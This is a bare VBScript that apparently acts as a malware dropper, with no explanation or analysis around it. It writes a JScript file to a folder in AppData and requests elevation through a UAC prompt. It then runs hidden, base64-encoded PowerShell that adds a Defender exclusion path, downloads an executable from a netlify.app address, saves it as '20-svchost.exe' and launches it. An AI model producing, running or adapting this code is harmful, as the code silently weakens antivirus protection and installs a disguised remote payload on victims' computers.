Set fso = CreateObject("Scripting.FileSystemObject"): Set shell = CreateObject("WScript.Shell"): appData = shell.ExpandEnvironmentStrings("%APPDATA%"): folderPath = appData & "\Custom-Application": If Not fso.FolderExists(folderPath) Then fso.CreateFolder(folderPath): fso.CreateFolder(folderPath & "\Files")
Set vbsfile = fso.CreateTextFile(folderPath & "\Files\New-File.js", True)
vbsfile.WriteLine "EnsureElevatedPrivileges();"
vbsfile.WriteLine "function EnsureElevatedPrivileges() {"
vbsfile.WriteLine "    if (!WScript.Arguments.Named.Exists(""elevate"")) {"
vbsfile.WriteLine "        new ActiveXObject(""Shell.Application"").ShellExecute(WScript.FullName, WScript.ScriptFullName + "" /elevate"", """", ""runas"", 1);"
vbsfile.WriteLine "        WScript.Quit();"
vbsfile.WriteLine "    }"
vbsfile.WriteLine "}"
vbsfile.WriteLine "var WshShell = new ActiveXObject(""WScript.Shell"");"
vbsfile.WriteLine "WshShell.run(""powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAANAAoA"", 0, true);"
vbsfile.WriteLine "WshShell.run(""powershell -enc JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBzAC0AcwBlAHIAdgBlAHIALgBuAGUAdABsAGkAZgB5AC4AYQBwAHAALwBmAGkAbABlAHMALwAyADAALQBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAIgANAAoAJABvAHUAdABwAHUAdAAgAD0AIAAiACQAZQBuAHYAOgBhAHAAcABkAGEAdABhAC8AMgAwAC0AcwB2AGMAaABvAHMAdAAuAGUAeABlACIADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABvAHUAdABwAHUAdAANAAoAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABvAHUAdABwAHUAdAA="", 0, true);"
vbsfile.WriteLine "WScript.Quit();"
vbsfile.Close
CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & folderPath & "\Files\New-File.js""", "", "", 0